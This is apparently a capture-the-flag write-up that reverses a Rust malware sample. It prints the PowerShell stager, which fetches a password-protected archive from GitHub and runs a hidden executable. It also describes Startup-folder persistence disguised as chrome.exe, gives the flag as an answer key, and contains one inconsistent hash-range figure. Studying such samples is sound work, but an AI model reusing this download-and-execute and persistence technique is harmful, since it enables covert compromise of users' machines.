# Incident Response 2: Wiege

> The malicious command downloaded and executed a binary. Find out what it did.
>
> Handout is the same as the one used to solve My Clematis.

**Authors:** `lvert` `shady`

**Flag:** `nite{1nsp1r3d_by_he_H3_xD_xqvylj8rtap8}`

1. Start from the decoded PowerShell that kicks off the intrusion:
   ```pwsh
   [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2x1a2EtNGV2ci9teS1sb3ZlL3Jhdy9yZWZzL2hlYWRzL21haW4vaG1tLjd6')) |
       ForEach-Object { $url = $_; $dir = "$env:USERPROFILE\Downloads\hmm_temp";
       New-Item -ItemType Directory -Path $dir -Force | Out-Null;
       $archive = "$dir\hmm.7z";
       Invoke-WebRequest -Uri $url -OutFile $archive; & "7z" x "-phyuluvhyuluvhyu" -o"$dir" $archive | Out-Null;
       Remove-Item $archive; Start-Process -FilePath "$dir\hash_encoder.exe" -WindowStyle Hidden -Wait;
       Remove-Item $dir -Recurse -Force }
   ```

   It downloads `hmm.7z` from GitHub, extracts it with password `hyuluvhyuluvhyu`, executes `hash_encoder.exe` quietly, then wipes the temporary directory.

2. Start reversing `hash_encoder.exe`, which is a Rust binary. The PE entrypoint performs standard CRT bootstrap (`start → __scrt_common_main_seh`) before transferring control into the Rust main shim, which ultimately resolves to the real logic function. A TLS callback is present but not relevant to runtime behavior. The effective main routine mirrors `main` from the source `main.rs` and coordinates all subsequent stages.

3. The main routine (`sub_140001780`) pulls two hardcoded secondary payloads from GitHub:

   * https://github.com/luka-4evr/my-heart/raw/refs/heads/main/caret-ware.exe
   * https://github.com/luka-4evr/my-saviour/raw/refs/heads/main/part2.txt

   A helper (`sub_140001120`) handles the download and buffering of the executable payload, with a paired cleanup routine (`sub_140001000`) used on failure paths to close handles and free memory.

4. Payload handling follows a consistent transformation pipeline. The text payload is base64-decoded, XOR-decrypted with the static key `ETIN`, and validated as UTF-8. The decrypted bytes are not written directly; instead, the malware constructs a persistence workspace under
   `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, ensuring the directory exists and choosing a randomly named subfolder from a fixed decoy list:

    - AppDataCache
    - Defender
    - Diagnostics
    - DriverStore
    - SystemCache
    - Telemetry
    - WMI
    - WinSxS
    - WindowsUpdate

   The executable payload is saved as `chrome.exe` inside Startup and spawned to establish persistence.

5. The decrypted data is emitted via a base-4 directory encoding scheme. For each plaintext byte (b), the program extracts four 2-bit digits:
   ```
   d_0 = b & 3
   d_1 = (b >> 2) & 3
   d_2 = (b >> 4) & 3
   d_3 = (b >> 6) & 3
   ```

   Each digit selects one of four hash “pools”. For every digit, the program repeatedly generates random base62 filenames until the computed hash falls inside the desired pool. File sizes are randomized between (1024) and (51200) bytes.

   The hash function is inlined and matches the Rust helper:

   ```py
   hash = 0xBAADF00D
   for byte in data:
       hash ^= byte
       hash = hash * 0x9E3779B1
       hash ^= hash >> 16
       hash = hash * 0x85EBCA77
       hash ^= hash >> 13
   hash &= 0xFFFFFF
   ```

   The 24-bit hash space is divided into four equal ranges of size (0x01000000), and the selected digit is: $digit = hash \gg 22$

6. On reconstruction, the directory tree is walked and the digit order is reversed relative to emission. One recovered byte is computed as:
    ```
    b = d_3 | (d_2 << 2) | (d_1 << 4) | (d_0 << 6)
    ```
   Each top-level directory therefore corresponds to exactly one plaintext byte.

7. Applying the reversed base-4 unwinding, followed by XOR with the key `ETIN`, fully recovers the embedded payload. Decoding the resulting UTF-8 text yields the final flag:

   ```
   nite{1nsp1r3d_by_he_H3_xD_xqvylj8rtap8}
   ```

Challenge Source Code:

- Solve script: [solve.py](solve.py)
- Source code: [main.rs](main.rs)

